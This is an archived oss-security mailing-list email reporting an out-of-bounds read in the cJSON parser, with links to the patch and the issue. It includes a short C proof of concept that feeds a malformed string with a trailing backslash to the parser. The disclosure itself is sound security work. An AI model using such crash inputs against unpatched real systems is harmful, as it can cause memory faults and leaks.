X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["840" "Sunday" "2" "October" "2016" "20:06:25" "+0800" "Marco Grassi" "marco.gra@gmail.com" "<CAFkTriK94p6uR1j3fznZpOXVa+vOa7tLSvSMgGEDSgin7_bhMg@mail.gmail.com>" "37" "[oss-security] cJSON buffer out of bound read" nil nil nil "10" "2016100212:06:25" "[oss-security] cJSON buffer out of bound read" (number mark "U       marco.gra@gm Oct  2   37/840   " thread-indent "\"[oss-security] cJSON buffer out of bound read\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3997 invoked by uid 550); 2 Oct 2016 12:06:39 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3967 invoked from network); 2 Oct 2016 12:06:37 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=7UeBRRcFngvHpaV6IdNtH2hOSDX0tObndGdBpWliQq0=;
        b=QDi635O5Yx2hwTk9aZjSr2Bow8p6Xe0hj7wBMIk7DqFbnkVtaBCy2sMYt9a4H2jFr2
         7utZLAmw99zTa4qVgTrUzaCOz0pylfGuhqm7/VUkFqoekexcRDkoSK/mm4nwsDZ4wfml
         6Ffum8zFbc/8Z5eQ0pzthMTjjizy4pupM3zP4FILDIrYQ/8vw8UcVJF9if1bdh1MWTLb
         6Nl6Kl5X37b4FQ9Ni+VwNn5RpRL6c4tadf0DCve8NjB9pTAkP68jU3MU2vKnmt4IFumR
         qoMeNahVvG2tjUxpJEq/OLrHEpEX4wawhuE0+WtCtWalWuFA8UogteeHjOfH45oHscgU
         KEUQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=7UeBRRcFngvHpaV6IdNtH2hOSDX0tObndGdBpWliQq0=;
        b=XdizI//cfEhsrwrpLg4GvIp7ZcHvNW1GoVb27TeBeDcJm40W0mQdU38Fod8UrtqsmK
         /HDNCSo47OHftF+Bs58yTjJb2vOnoAcVtggT23bl7QllK2KPHsZ50qY6MS7LgrvxzQR0
         WJ7CgRpriuUMhVSTsjrBPIhPEml5WlQMSZw6cYmvC9uy3f0UrLzICdSKI2Y7JQ050g6t
         fz1uGVpApuoAD47Pftuiszgr3WI/xl3flSzaw82L+ZN0Y5W9VBvjtwUxUu5SNg2umkfp
         ZqCooi2CWWg3ZSswPNGI77Lelpq+ItpKcTVTXWgfAMcR7fsjnX7LfUPOrVPFTAu3HcaF
         H16w==
X-Gm-Message-State: AA6/9RlqlLa7kIb9W4NeJpA6PzG9HabM8ubOTrlotkFtujEPKuTWBfn5UUf+XX/9MqsNCF/Kmmk1QYuAiKSTbg==
X-Received: by 10.107.57.139 with SMTP id g133mr19308222ioa.176.1475409985403;
 Sun, 02 Oct 2016 05:06:25 -0700 (PDT)
MIME-Version: 1.0
From: Marco Grassi <marco.gra@gmail.com>
Date: Sun, 2 Oct 2016 20:06:25 +0800
Message-ID: <CAFkTriK94p6uR1j3fznZpOXVa+vOa7tLSvSMgGEDSgin7_bhMg@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: cve-assign@mitre.org
Content-Type: multipart/alternative; boundary=001a114ac88a140224053de0a894
Subject: [oss-security] cJSON buffer out of bound read

--001a114ac88a140224053de0a894
Content-Type: text/plain; charset=UTF-8

Hi,

I would like to report a buffer out of bound read problem in cJSON, which
is a embeddable JSON parser, used (I imagine) in embedded devices, or even
bigger stuff like the ps4 (
http://doc.dl.playstation.net/doc/ps4-oss/cjson.html).

patch:
https://github.com/DaveGamble/cJSON/commit/94df772485c92866ca417d92137747b2e3b0a917

issue:
https://github.com/DaveGamble/cJSON/issues/30

Poc with the malformed string

#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include "cJSON.h"

static const char *my_json = "\"000000000000000000\\";

int main(int argc, const char * argv[]) {
    cJSON * root = cJSON_Parse(my_json);
    char * rendered = cJSON_Print(root);
    printf("%s\n", rendered);
    return 0;
}

thanks

Marco

--001a114ac88a140224053de0a894--
